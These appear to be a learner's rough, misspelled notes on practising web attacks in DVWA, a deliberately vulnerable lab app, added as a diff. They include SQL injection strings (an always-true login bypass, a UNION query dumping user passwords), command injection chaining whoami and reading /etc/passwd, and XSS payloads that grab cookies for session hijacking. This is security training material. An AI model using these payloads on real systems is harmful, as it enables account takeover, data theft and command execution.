@@ -1,0 +1,58 @@
+We have to learn how to do attack there is one website {DVWA  Damn Vulnearable Web Application}
+	Debian      {We have to do it your own from the  webite just type debain install DVWA }	
+			Apache2, mysql,php,deploy
+	Kali		
+Sudo apt update
+Sudo apt install dvwa
+Sudo dvwa-start   {when you star tfirefox will run automatically 127.0.0.1:42001/login.php}
+{admin	admin}{usernamea and password}
+Sudo mysql -u root -p
+Show databese
+Use dvwa
+Show tables 
+Select * from guestbook;
+Select * from users ;
+
+
+SQL INJECTION   USERNAME =	 ‘tinku’  and password= ‘tinku’ 
+	If the username and password is wiritw is then yoou get login   ==== true 
+	Otherwise false    ### there is username and password   then both should be 	true
+
+Select * from credentials wher username  = ‘ ‘ and password= ‘ ‘;
+‘or’1’=’1
+Select * from credentials wher username  = ‘ ‘or’1’=’1’
+‘ and password= ‘ admin‘;
+# same user and password
+Select * from credentials wher username  = ‘ ‘or’1’=’1’
+‘ and password= ‘ or’1’=’1‘;
+
+----------------------------------------------------------------------------------------------
+command injection 
+
+We are doing command injection if one file is true then another will get executed 
+Example of ping of one machie  127.0.0.1 && ls                   ##  127.0.0.1 & pwd
+			127.0.0.1 && whoami             dvwa
+If you’re a using root user in apache2 I can get all permission 
+Cat index.html	/etc/passwd	/etc/group
+----------------------------------------------------------------------------------------------
+
+SQL INJECTION IN DVWA
+	Vunearbailty of sql injection   userid   :              1 			2
+Use union 			query   :     1’ UNION SELECT user,password FROM users;-- -&Submit=Submit
+
+-- Commenting indicatior :
+Everthing after -- is ognored by the sql engine 
+
+UNION SELECT user,password FROM users; -- -&
+
+Xss stored
+<script> alert “helloooo” </script>
+
+
+Xss vulnearability reflected crss site scripting (XSS)
+		We are running url scripting       {we are doing }
+<script>alert (document .cookie )</script>                         {we can also perform session hijacking }
+
+Vulnearability based on DOM{Docummnet object model} based cross site scripting XXS
+				We have write scrip in url after selecting language
+
